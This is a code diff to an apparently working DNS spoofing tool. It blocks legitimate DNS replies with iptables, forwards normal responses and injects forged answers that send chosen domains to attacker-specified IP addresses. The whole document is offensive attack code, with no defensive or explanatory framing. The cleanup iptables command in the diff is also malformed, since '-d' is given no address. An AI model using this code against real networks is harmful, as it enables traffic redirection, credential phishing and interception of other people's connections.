@@ -42,6 +42,8 @@ def start_attack(table, interface):
     '''
 
     interface = get_interface(interface)
+    print('setting ip tables')
+    subprocess.run(['iptables', '-A', 'FORWARD', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
 
     # Start subthread running attack
     attack_thread = threading.Thread(target=attack, args=(table,interface,))
@@ -50,9 +52,12 @@ def start_attack(table, interface):
     try:
         # Wait for keyboard interrupt
         while True:
-            time.sleep(0.1)
+            time.sleep(2)
+            print('dns spoofing')
     except KeyboardInterrupt:
         # Set stop_event when keyboard interrupt occurs
+        print('resetting ip tables')
+        subprocess.run(['iptables', '-D', 'FORWARD', '-d', '-p', 'udp', '--sport', '53', '-j' 'DROP'])
         stop_event.set()
         attack_thread.join()
 
@@ -76,15 +81,16 @@ def analyze_packet(packet, table, interface):
 
     # Filter out answers
     if packet[DNS].qr != 0:
+        click.echo(f'Sent the normal dns response')
+        forward_dns(packet, interface)
         return
 
     query_name = get_packet_query_name(packet[DNS])
 
     if query_name in table:
         click.echo(f'Found a query to spoof: {query_name}')
-        subprocess.run(['iptables', '-A', 'FORWARD', '-d', packet[IP].dst, '-p', 'udp', '--sport', '53', '-j' 'DROP'])
+        
         spoof_packet(packet, query_name, table[query_name], interface)
-        subprocess.run(['iptables', '-D', 'FORWARD', '-d', packet[IP].dst, '-p', 'udp', '--sport', '53', '-j' 'DROP'])
         return
 
 
@@ -118,6 +124,13 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip, interface):
     click.echo("Sending spoofed packet")
 
     send(spoofed_reply, iface=interface)
+
+def forward_dns(packet, interface):
+    '''
+    Forwards the normal dns response
+    '''
+
+    send(packet, iface=interface)
 
 
 def get_packet_query_name(dns_packet):
